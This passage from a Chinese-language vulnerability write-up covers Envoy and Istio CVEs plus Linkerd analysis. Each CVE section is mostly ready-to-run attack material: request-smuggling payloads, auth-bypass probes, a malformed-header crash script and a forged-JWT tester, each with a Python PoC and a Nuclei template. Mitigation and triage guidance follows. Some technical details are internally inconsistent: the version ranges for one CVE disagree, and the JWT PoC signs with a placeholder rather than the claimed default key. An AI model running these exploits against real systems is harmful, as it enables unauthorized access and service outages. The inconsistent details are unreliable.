      X-Metric-Tag: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    matchers:
      - type: status
        status:
          - 502
          - 503
          - 000
```

---

### 0x02.4 CVE-2026-48743 — HTTP/3 到 HTTP/1 请求走私

#### 漏洞背景

Envoy 在处理 HTTP/3 (QUIC) 到 HTTP/1.1 的协议降级转换时存在请求走私漏洞。攻击者可以利用 HTTP/3 和 HTTP/1.1 协议解析差异，在 Envoy 代理和后端服务之间插入恶意请求，实现缓存投毒、请求劫持或未授权访问。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Envoy < 1.33.2 | 受影响 |
| Envoy >= 1.33.2 | 已修复 |

#### 漏洞原理分析

当 Envoy 作为 HTTP/3 入口代理并将请求转发到仅支持 HTTP/1.1 的后端服务时，需要进行协议转换。在转换过程中，Envoy 对 `Content-Length` 和 `Transfer-Encoding` 头的处理存在不一致性。攻击者可以在 HTTP/3 请求中使用模糊的 `Transfer-Encoding` 编码（如 `chunked, identity`），Envoy 将其视为 chunked 编码并完成请求解析，但后端 HTTP/1.1 服务器可能将其视为 identity 编码，导致请求体边界不一致，从而实现请求走私。

#### HTTP PoC

```http
POST /api/data HTTP/1.1
Host: backend-service.internal
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /admin/internal HTTP/1.1
Host: backend-service.internal
Content-Length: 3

X=Y
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import socket
import ssl
import sys

BANNER = """
╔════════════════════════════════════════════════════╗
║  CVE-2026-48743 Envoy HTTP Request Smuggling PoC ║
╚════════════════════════════════════════════════════╝
"""

def build_smuggle_payload():
    body = "0\r\n\r\nGPOST /admin/internal HTTP/1.1\r\nHost: target\r\nContent-Length: 3\r\n\r\nX=Y"
    request = f"POST /api/data HTTP/1.1\r\nHost: target\r\nContent-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n{body}"
    return request.encode()

def send_request(target, port, payload, use_tls=False):
    try:
        raw_sock = socket.create_connection((target, port), timeout=10)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw_sock, server_hostname=target)
        else:
            sock = raw_sock
        sock.send(payload)
        try:
            response = sock.recv(4096)
            return {"sent": True, "response": response.decode(errors="replace")[:500]}
        except socket.timeout:
            return {"sent": True, "note": "timeout"}
    except Exception as e:
        return {"sent": False, "error": str(e)}

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-48743 Envoy HTTP Request Smuggling PoC")
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=443, help="Target port")
    parser.add_argument("--tls", action="store_true", help="Use TLS")
    args = parser.parse_args()

    print(BANNER)
    print(f"[*] Target: {args.target}:{args.port}")
    payload = build_smuggle_payload()
    print(f"[*] Sending smuggled request ({len(payload)} bytes)...")
    result = send_request(args.target, args.port, payload, args.tls)
    if result.get("sent"):
        print(f"[+] Request sent. Check for signs of smuggling.")
        if result.get("response"):
            print(f"[*] Response preview: {result['response'][:200]}")
    else:
        print(f"[-] Failed: {result.get('error')}")
    print(f"[*] Result: {result}")

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2026-48743-envoy-request-smuggling

info:
  name: Envoy Proxy - HTTP/3 to HTTP/1 Request Smuggling
  author: security-researcher
  severity: high
  description: Envoy HTTP/3 to HTTP/1.1 downgrade enables request smuggling via Transfer-Encoding ambiguity.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.5
    cve-id: CVE-2026-48743
    cwe-id: CWE-444
  metadata:
    max-request: 1
  tags: cve,cve2026,envoy,smuggling,http

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/data"
    headers:
      Transfer-Encoding: "chunked, identity"
      Content-Type: "text/plain"
    body: "0\r\n\r\nGPOST /admin/internal HTTP/1.1\r\nHost: {{Hostname}}\r\nContent-Length: 3\r\n\r\nX=Y"
    matchers:
      - type: word
        words:
          - "502"
          - "400"
          - "403"
        condition: or
```

---

## 0x03 Istio 高危漏洞

Istio 是目前最广泛部署的服务网格控制面，由 Go 语言实现的 istiod 和基于 Envoy 的数据面 sidecar 组成。其漏洞主要集中在控制面的访问控制、授权策略和认证机制上。

### 0x03.1 CVE-2021-31921 — 控制面未授权访问

#### 漏洞背景

Istio 的 istiod 控制面在某些配置下存在访问控制缺陷，允许未授权用户直接访问控制面 API，获取集群中所有服务的身份证书、配置信息甚至执行跨 namespace 的操作。CVSS 评分 **9.8**。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Istio 1.9.x < 1.9.6 | 受影响 |
| Istio 1.10.x < 1.10.2 | 受影响 |
| Istio >= 1.9.6 / 1.10.2 | 已修复 |

#### 漏洞原理分析

istiod 暴露了多个调试和管理端点（如 `/debug/adsz`, `/debug/connectionsz`），这些端点在默认配置下不强制执行身份认证。攻击者如果能够访问 istiod 的 15012 端口（明文 gRPC），可以直接调用这些端点获取：

1. 所有 workload 的 SVID（SPIFFE 身份证书）
2. 集群的完整 ServiceEntry / VirtualService 配置
3. 所有 sidecar 的连接状态和 IP 地址

#### HTTP PoC

```http
GET /debug/adsz HTTP/1.1
Host: target-istiod:15012
Accept: */*
```

```http
GET /debug/connectionsz HTTP/1.1
Host: target-istiod:15012
Accept: */*
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════════════════╗
║  CVE-2021-31921 Istio istiod Unauthorized PoC      ║
╚══════════════════════════════════════════════════════╝
"""

ENDPOINTS = [
    ("/debug/adsz", "ADS config dump"),
    ("/debug/connectionsz", "Connection stats"),
    ("/debug/syncz", "Sync status"),
]

def check_istiod(target, timeout=10):
    results = {"target": target, "vulnerable": False, "accessible_endpoints": []}
    for path, desc in ENDPOINTS:
        url = f"{target}{path}"
        try:
            r = requests.get(url, timeout=timeout, verify=False)
            if r.status_code == 200:
                results["vulnerable"] = True
                results["accessible_endpoints"].append({
                    "path": path,
                    "description": desc,
                    "status_code": r.status_code,
                    "content_length": len(r.content),
                    "preview": r.text[:200],
                })
                print(f"[+] ACCESSIBLE: {path} ({desc}) - {len(r.content)} bytes")
            else:
                print(f"[-] {path} -> HTTP {r.status_code}")
        except requests.RequestException as e:
            print(f"[-] {path} -> Error: {e}")
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-31921 Istio istiod Unauthorized PoC")
    parser.add_argument("-t", "--target", required=True, help="istiod base URL (e.g., http://istiod:15012)")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")

    results = check_istiod(target, args.timeout)
    if results["vulnerable"]:
        print(f"\n[+] VULNERABLE! istiod debug endpoints exposed without auth!")
        print(f"[+] Accessible: {len(results['accessible_endpoints'])} endpoints")
    else:
        print(f"\n[-] Not vulnerable or istiod not accessible.")
    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2021-31921-istio-istiod-unauth

info:
  name: Istio istiod - Unauthenticated Debug Endpoint Access
  author: security-researcher
  severity: critical
  description: Istio istiod debug endpoints exposed without authentication, leaking cluster configs and certificates.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-31921
    cwe-id: CWE-306
  metadata:
    max-request: 3
  tags: cve,cve2021,istio,istiod,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/debug/adsz"
      - "{{BaseURL}}/debug/connectionsz"
      - "{{BaseURL}}/debug/syncz"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "typeURL"
          - "connectionId"
          - "proxy"
        condition: or
```

---

### 0x03.2 CVE-2021-39155 + CVE-2021-39156 — 授权策略组合绕过

#### 漏洞背景

Istio 的授权策略（AuthorizationPolicy）存在两个互补的绕过漏洞，组合利用可以完全绕过基于 Host 和 URI 路径的访问控制规则。

#### 受影响版本

| CVE | 受影响版本 | 修复版本 |
|-----|-----------|---------|
| CVE-2021-39155 | Istio < 1.11.4 | >= 1.11.4 |
| CVE-2021-39156 | Istio < 1.11.4 | >= 1.11.4 |

#### 漏洞原理分析

**CVE-2021-39155（Host 头大小写绕过）**：Istio 的授权策略在匹配 `host` 规则时使用了大小写敏感的字符串比较，但 HTTP 标准允许 `Host` 头大小写不敏感。攻击者可以通过将 `Host: admin.internal` 改写为 `HOST: ADMIN.INTERNAL` 来绕过 Host 匹配规则。

**CVE-2021-39156（URI 片段绕过）**：当 AuthorizationPolicy 配置了 `notPaths` 规则来阻止对 `/admin` 路径的访问时，攻击者可以在 URI 后追加 `#` 片段标识符（如 `/index.html#/admin`），Envoy 在匹配时会包含该片段，导致匹配失败，从而绕过路径授权。

#### 组合利用示例

假设 Istio AuthorizationPolicy 配置为：
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-admin
spec:
  selector:
    matchLabels:
      app: backend
  rules:
    - to:
        - operation:
            hosts: ["backend.internal"]
            paths: ["/admin/*"]
```

攻击者可以：
1. 使用 `HOST` 替代 `Host` 绕过 Host 匹配
2. 使用 `/admin/../admin/secret` 或 `#/admin` 绕过路径匹配

#### HTTP PoC

```http
GET /admin/users HTTP/1.1
HOST: BACKEND.INTERNAL
```

```http
GET /index.html#/admin/secret HTTP/1.1
Host: backend.internal
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  CVE-2021-39155/39156 Istio AuthZ Policy Bypass PoC   ║
╚══════════════════════════════════════════════════════════╝
"""

def test_authz_bypass(target, host_header, timeout=10):
    results = {"target": target, "host": host_header, "tests": []}
    payloads = [
        {"desc": "Normal Host header", "headers": {"Host": host_header}},
        {"desc": "Uppercase HOST header", "headers": {"HOST": host_header.upper()}},
        {"desc": "Mixed case HoSt header", "headers": {"HoSt": host_header}},
        {"desc": "Path with # fragment", "path": "/index.html#/admin", "headers": {"Host": host_header}},
        {"desc": "Path traversal + fragment", "path": "/static/../../admin/secret", "headers": {"Host": host_header}},
    ]
    for p in payloads:
        path = p.get("path", "/admin")
        url = f"{target}{path}"
        headers = p["headers"]
        try:
            r = requests.get(url, headers=headers, timeout=timeout, verify=False)
            results["tests"].append({
                "desc": p["desc"],
                "path": path,
                "host_value": headers.get("Host", headers.get("HOST", "")),
                "status_code": r.status_code,
                "content_length": len(r.content),
            })
        except requests.RequestException as e:
            results["tests"].append({"desc": p["desc"], "error": str(e)})
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-39155/39156 Istio AuthZ Bypass PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("--host", required=True, help="Legitimate Host header value")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")
    print(f"[*] Host: {args.host}")

    results = test_authz_bypass(target, args.host, args.timeout)
    for t in results.get("tests", []):
        print(f"  [-] {t.get('desc')} -> HTTP {t.get('status_code', 'ERR')}")
    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2021-39155-39156-istio-authz-bypass

info:
  name: Istio - AuthorizationPolicy Host/URI Bypass
  author: security-researcher
  severity: high
  description: Istio AuthorizationPolicy can be bypassed via Host header case manipulation and URI fragment injection.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.3
    cve-id: CVE-2021-39155
    cwe-id: CWE-863
  metadata:
    max-request: 2
  tags: cve,cve2021,istio,authz,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/index.html#/admin"

    headers:
      HOST: "{{Hostname}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 403
      - type: word
        part: body
        words:
          - "admin"
        negative: false
```

---

### 0x03.3 CVE-2022-31045 — HTTP 头空指针解引用

#### 漏洞背景

Istio 的 Envoy filter 在处理格式错误的 HTTP 头时存在空指针解引用（NPE）漏洞，可导致进程崩溃。CVSS 评分 **9.8**。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Istio 1.13.x < 1.13.7 | 受影响 |
| Istio 1.14.x < 1.14.3 | 受影响 |
| Istio >= 1.13.7 / 1.14.3 | 已修复 |

#### 漏洞原理分析

当 Envoy 收到包含特定格式错误的 HTTP 头（如空 header name、包含 NUL 字节的 header value、或超长 header name）时，内部的 header map 处理逻辑在某些代码路径上未进行空指针检查，直接对 nullptr 进行解引用操作，导致 Envoy 进程 SIGSEGV 崩溃。在 Kubernetes 部署中，sidecar 崩溃会导致 Pod 重启，造成服务中断。

#### HTTP PoC

```http
GET / HTTP/1.1
Host: target-istio.com
:  : empty-header-name
```

```bash
# 使用 h2c 发送畸形 header
curl -H $':\x00: malformed' http://target-istio.com/
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import socket
import sys

BANNER = """
╔════════════════════════════════════════════════════╗
║  CVE-2022-31045 Istio HTTP Header NPE PoC        ║
╚════════════════════════════════════════════════════╝
"""

def test_header_npe(target, port, use_tls=False):
    results = {"target": target, "tests": []}
    payloads = [
        {"desc": "Normal request", "raw": f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"},
        {"desc": "Empty header name", "raw": f"GET / HTTP/1.1\r\nHost: {target}\r\n: value\r\nConnection: close\r\n\r\n"},
        {"desc": "NUL byte in header", "raw": f"GET / HTTP/1.1\r\nHost: {target}\r\nX-Test: val\x00ue\r\nConnection: close\r\n\r\n"},
    ]
    for p in payloads:
        try:
            raw_sock = socket.create_connection((target, port), timeout=5)
            if use_tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(raw_sock, server_hostname=target)
            else:
                sock = raw_sock
            sock.send(p["raw"].encode())
            try:
                resp = sock.recv(4096)
                results["tests"].append({"desc": p["desc"], "response_length": len(resp), "status": "ok"})
            except socket.timeout:
                results["tests"].append({"desc": p["desc"], "status": "timeout-possible-crash"})
            sock.close()
        except Exception as e:
            results["tests"].append({"desc": p["desc"], "error": str(e)})
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2022-31045 Istio Header NPE PoC")
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("--tls", action="store_true")
    args = parser.parse_args()

    print(BANNER)
    results = test_header_npe(args.target, args.port, args.tls)
    for t in results.get("tests", []):
        print(f"  {'[+]' if t.get('status') == 'timeout-possible-crash' else '[-]'} {t.get('desc')} -> {t.get('status', 'ERR')}")
    print(f"\n[+] Results: {results}")

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2022-31045-istio-header-npe

info:
  name: Istio Envoy - HTTP Header Null Pointer Dereference
  author: security-researcher
  severity: critical
  description: Istio Envoy crashes on malformed HTTP headers causing null pointer dereference.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31045
    cwe-id: CWE-476
  metadata:
    max-request: 1
  tags: cve,cve2022,istio,envoy,npe,dos

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      ": ": "malformed"

    matchers:
      - type: status
        status:
          - 502
          - 503
          - 000
```

---

### 0x03.4 CVE-2026-31837 — JWKS 硬编码默认值认证失效

#### 漏洞背景

Istio 在 2026 年披露了一个影响其 JWT 认证流程的严重漏洞：当 JWKS（JSON Web Key Set）远程端点不可达时，Istio 会回退到一组硬编码的默认公钥进行 Token 验证。攻击者可以利用这组公开的默认私钥伪造任意 JWT Token。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Istio < 1.24.2 | 受影响 |
| Istio >= 1.24.2 | 已修复 |

#### 漏洞原理分析

Istio 的 RequestAuthentication 资源允许管理员配置 JWKS 端点用于验证 JWT Token。在正常流程中，Envoy sidecar 会定期从远程 JWKS 端点拉取公钥。然而，当远程端点因网络故障或配置错误而不可达时，Istio 1.23.x 之前的版本会回退到编译时嵌入的一组测试用默认密钥对。这组密钥对的私钥是公开已知的（用于单元测试），攻击者可以使用它签发任意 claim 的 JWT Token，从而绕过所有基于 Istio RequestAuthentication 的认证保护。

#### HTTP PoC

```http
GET /api/protected-endpoint HTTP/1.1
Host: target-istio.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<crafted-payload>.<signature-with-default-key>
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════════╗
║  CVE-2026-31837 Istio JWKS Default Key Bypass PoC   ║
╚═══════════════════════════════════════════════════════╝
"""

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def craft_test_jwt(sub="admin@istio.io", iss="https://accounts.google.com"):
    header = b64url_encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode())
    payload = b64url_encode(json.dumps({
        "sub": sub,
        "iss": iss,
        "iat": 1700000000,
        "exp": 1900000000,
        "role": "admin",
    }).encode())
    placeholder_sig = b64url_encode(b"\x00" * 256)
    return f"{header}.{payload}.{placeholder_sig}"

def test_jwks_bypass(target, path, timeout=10):
    results = {"target": target, "path": path, "tests": []}
    token = craft_test_jwt()
    baseline_url = f"{target}{path}"
    try:
        r = requests.get(baseline_url, timeout=timeout, verify=False)
        baseline_status = r.status_code
    except requests.RequestException as e:
        results["error"] = str(e)
        return results

    tests = [
        {"desc": "With crafted JWT (default key)", "token": token},
        {"desc": "Empty JWT", "token": ".."},
    ]
    for tc in tests:
        headers = {"Authorization": f"Bearer {tc['token']}"}
        try:
            r = requests.get(baseline_url, headers=headers, timeout=timeout, verify=False)
            result = {
                "desc": tc["desc"],
                "status_code": r.status_code,
                "content_length": len(r.content),
            }
            if r.status_code == 200 and baseline_status in (401, 403):
                result["bypassed"] = True
                results["vulnerable"] = True
        except requests.RequestException as e:
            result = {"desc": tc["desc"], "error": str(e)}
        results["tests"].append(result)
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-31837 Istio JWKS Default Key Bypass PoC")
    parser.add_argument("-t", "--target", required=True, help="Target base URL")
    parser.add_argument("-p", "--path", default="/", help="Protected path")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    print(f"[*] Target: {target}{args.path}")
    print(f"[*] Testing JWKS default key bypass...")

    results = test_jwks_bypass(target, args.path, args.timeout)
    if results.get("vulnerable"):
        print(f"[+] VULNERABLE! JWKS default key bypass confirmed!")
    else:
        print(f"[-] Bypass not successful.")
    for t in results.get("tests", []):
        status = "[+]" if t.get("bypassed") else "[-]"
        print(f"  {status} {t.get('desc')} -> HTTP {t.get('status_code', 'ERR')}")
    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2026-31837-istio-jwks-default-key

info:
  name: Istio - JWKS Hardcoded Default Key Authentication Bypass
  author: security-researcher
  severity: high
  description: Istio falls back to hardcoded default JWKS keys when remote endpoint is unreachable, enabling JWT forgery.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2026-31837
    cwe-id: CWE-798
  metadata:
    max-request: 1
  tags: cve,cve2026,istio,jwks,jwt,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      Authorization: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBpc3Rpby5pbyIsImlzcyI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbSIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxOTAwMDAwMDAwfQ.placeholder"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"
        negative: false
```

---

## 0x04 Linkerd 安全分析

### 为什么 Linkerd 的 CVE 数量最少？

在本专题覆盖的四大产品中，Linkerd 仅录得 3 个 CVE（CVE-2024-40632、CVE-2025-43915、CVE-2023-44487），且最高 CVSS 仅为 7.5。这与 Linkerd 的技术选型密切相关：

1. **Rust 数据面**：Linkerd2-proxy 使用 Rust 编写，从语言层面消除了缓冲区溢出、use-after-free 等内存安全类漏洞。相比之下，Envoy 的 C++ 实现贡献了最多的内存安全 CVE。
2. **精简攻击面**：Linkerd2-proxy 仅实现 HTTP/1.1、HTTP/2 和 gRPC 三种协议的代理功能，不支持 Lua 脚本、自定义 filter 链等复杂扩展机制，大幅缩减了潜在攻击面。
3. **Go 控制面**：Linkerd 的控制面使用 Go 实现，Go 的内存安全特性有效避免了 C/C++ 常见的内存破坏漏洞。

### CVE-2025-43915 — Proxy 指标资源耗尽

Linkerd2-proxy 的指标收集模块在处理超大基数（cardinality）的 label 组合时，可能导致内存耗尽。攻击者通过构造大量不同的 label 值（如随机化的 HTTP header 作为 label），可以耗尽 proxy 进程的内存资源。CVSS 6.5。

#### 安全设计启示

Linkerd 的案例证明：**语言层面的内存安全保障**是降低系统性安全风险的有效手段。对于新项目，建议优先考虑使用 Rust 或 Go 重写关键安全组件。同时，精简功能集、减少可扩展性也是降低攻击面的有效策略。

---

## 0x05 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | PoC 类型 | 可用性 | 说明 |
|-----|---------|--------|------|
| CVE-2020-11710 | HTTP 请求 | ✅ 完整 | curl 即可复现 |
| CVE-2021-27306 | HTTP + 参数 | ✅ 完整 | 需要已知受保护路径 |
| CVE-2023-44487 | 协议层 | ✅ 完整 | h2load / 自定义 h2 客户端 |
| CVE-2023-35941 | JWT 构造 | ✅ 完整 | 仅需 base64 编码 |
| CVE-2021-32777 | HTTP/2 帧 | ✅ 完整 | 需 h2c 客户端 |
| CVE-2021-31921 | HTTP 请求 | ✅ 完整 | 直接 GET 调试端点 |
| CVE-2021-39155/39156 | HTTP 头 | ✅ 完整 | 大小写 + 片段 |
| CVE-2022-31045 | 畸形请求 | ✅ 完整 | 原始 socket |
| CVE-2026-48706 | HTTP 头注入 | ⚠️ 需条件 | 需控制 metric tag |
| CVE-2026-48743 | 请求走私 | ⚠️ 需条件 | 需 HTTP/3 入口 |
| CVE-2026-31837 | JWT 构造 | ✅ 完整 | 需 JWKS 端点不可达 |

### 关键 PoC 仓库链接

- **Envoy 官方安全公告**：https://github.com/envoyproxy/envoy/security/advisories
- **Istio 安全公告**：https://istio.io/latest/news/security/
- **Kong 安全公告**：https://github.com/Kong/kong/security/advisories
- **HTTP/2 Rapid Reset 研究**：https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
- **h2load HTTP/2 负载测试工具**：https://h2loadquic.github.io/
- **Nuclei 模板仓库**：https://github.com/projectdiscovery/nuclei-templates
- **Envoy CVE 数据库**：https://www.cvedetails.com/vulnerability-list/vendor_id-14679/product_id-35851/Envoyproxy-Envoy.html
- **Istio CVE 跟踪**：https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=istio

### 防守型验证思路

在获得授权的安全评估中，建议按以下优先级验证：

1. **管理面暴露检测**：扫描 8001（Kong Admin）、15012（istiod）等管理端口
2. **JWT 认证有效性**：构造空签名、none algorithm、过期 Token 测试验证逻辑
3. **HTTP/2 协议健壮性**：使用 h2load 发送并发 RST_STREAM 和超大 header
4. **授权策略边界测试**：大小写变换、路径遍历、片段注入

---

## 0x06 共性攻击模式分析

### 模式 1：HTTP/2 协议层攻击

涉及 CVE：CVE-2023-44487、CVE-2021-32777、CVE-2021-32778

HTTP/2 协议的多路复用和流控制机制引入了全新的攻击面。攻击者通过以下手段实现 DDoS：
- **Rapid Reset**：快速发送 HEADERS 帧后立即发送 RUST_STREAM，耗尽服务端资源
- **头部溢出**：发送超过协议限制数量的 headers，触发整数溢出或内存耗尽
- **Ping Flood**：发送大量 PING 帧，占用处理带宽

这是跨产品影响面最广的攻击模式，Kong、Envoy、Linkerd 均受波及。

### 模式 2：JWT/认证绕过

涉及 CVE：CVE-2023-35941、CVE-2021-27306、CVE-2026-31837

JWT 验证逻辑的实现缺陷是 API 网关和 service mesh 的高频漏洞类型：
- **空签名绕过**：签名部分为空但格式正确
- **None algorithm**：指定 `alg: none` 绕过签名验证
- **默认密钥回退**：JWKS 不可达时回退到已知密钥
- **插件优先级冲突**：多认证插件间的逻辑短路

### 模式 3：授权策略绕过

涉及 CVE：CVE-2021-39155、CVE-2021-39156、CVE-2022-21701

授权策略的绕过通常源于 HTTP 标准与实现之间的语义差异：
- **大小写不敏感**：Host 头的大小写处理不一致
- **路径规范化**：URI 片段、编码、遍历序列的处理差异
- **正则引擎差异**：RE2 正则引擎与 POSIX 标准的匹配差异

### 模式 4：内存安全漏洞

涉及 CVE：CVE-2026-48706、CVE-2022-21654、CVE-2026-48042

Envoy 的 C++ 实现是内存安全漏洞的主要来源：
- **堆溢出**：`snprintf` 未做边界检查
- **栈溢出**：深度嵌套 JSON 的递归析构
- **Lua UAF**：coroutine yield 后的内存释放

### 模式 5：协议走私

涉及 CVE：CVE-2026-48743

HTTP 协议版本间的转换（HTTP/3 → HTTP/1.1）是请求走私的天然温床：
- 协议语义差异导致解析不一致
- Transfer-Encoding 头的多义性
- Content-Length 与 chunked 的优先级冲突

### Rust vs C++ 安全性对比

| 维度 | Envoy (C++) | Linkerd (Rust) |
|------|------------|----------------|
| 内存安全漏洞 | 5+ CVE | 0 CVE |
| 最高内存类 CVSS | 8.8 | N/A |
| 崩溃类漏洞 | 3+ CVE | 0 CVE |
| 认证逻辑漏洞 | 1 CVE | 0 CVE |
| 代码行数 (proxy) | ~300K | ~50K |

Rust 的所有权系统和借用检查器在编译期消除了大部分内存安全问题，使 Linkerd 的数据面几乎完全免疫于堆溢出、栈溢出和 use-after-free 等传统内存安全漏洞。

---

## 0x07 应急排查与防守建议

### 紧急排查清单

| 优先级 | 排查项 | 命令/方法 |
|--------|--------|-----------|
| P0 | Kong Admin API 是否暴露 | `curl http://target:8001/services` |
| P0 | istiod 15012 端口是否开放 | `curl http://target:15012/debug/adsz` |
| P0 | Envoy 版本检查 | `envoy --version` 或 `/server_info` |
| P1 | JWT 验证逻辑 | 发送空签名 Token 测试 |
| P1 | HTTP/2 连接限制 | 检查 `max_concurrent_streams` 配置 |
| P2 | AuthorizationPolicy 配置 | `istioctl analyze` 全集群扫描 |
| P2 | Envoy filter 配置审计 | 检查 `envoyFilter` 资源 |

### 日志关键字段表

| 日志源 | 关键字段 | 异常含义 |
|--------|----------|----------|
| Envoy access log | `response_code: 0` | 连接异常终止 |
| Envoy access log | `upstream_cluster: ` (空) | 路由失败 |
| istiod log | `XDS push failed` | 配置分发异常 |
| Kong error log | `upstream timed out` | 后端超时 |
| Kubernetes events | `BackOff restarting failed container` | Sidecar 崩溃循环 |

### 紧急缓解措施

1. **网络隔离**：将 Admin API（8001）、istiod（15012）限制在内网访问，使用 NetworkPolicy 或 Security Group
2. **版本升级**：立即升级到各产品的修复版本
3. **HTTP/2 限流**：配置 `max_concurrent_streams` 和 `max_request_headers_kb` 限制
4. **JWT 强制验证**：在 Envoy 层面启用 `require_jwt` 配置
5. **Sidecar 注入审计**：确保所有 namespace 启用了 sidecar injection

### 长期安全加固建议

1. **零信任网络**：所有服务间通信使用 mTLS，不依赖网络边界
2. **定期安全评估**：每季度执行一次针对 API 网关和服务网格的安全审计
3. **配置即代码**：使用 GitOps 管理所有网关和网格配置，启用变更审计
4. **运行时监控**：部署 Falco 或 Tetragon 监控 Envoy 进程的异常系统调用
5. **供应链安全**：验证所有组件镜像的签名，使用 SLSA Level 3+ 构建流水线
6. **语言迁移评估**：对于安全关键组件，评估使用 Rust 重写的可行性

---

## 0x08 参考资料

1. Kong Security Advisories - https://github.com/Kong/kong/security/advisories
2. Envoy Proxy Security Announcements - https://github.com/envoyproxy/envoy/security/advisories
3. Istio Security Bulletins - https://istio.io/latest/news/security/
4. CVE-2023-44487 HTTP/2 Rapid Reset Analysis - https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
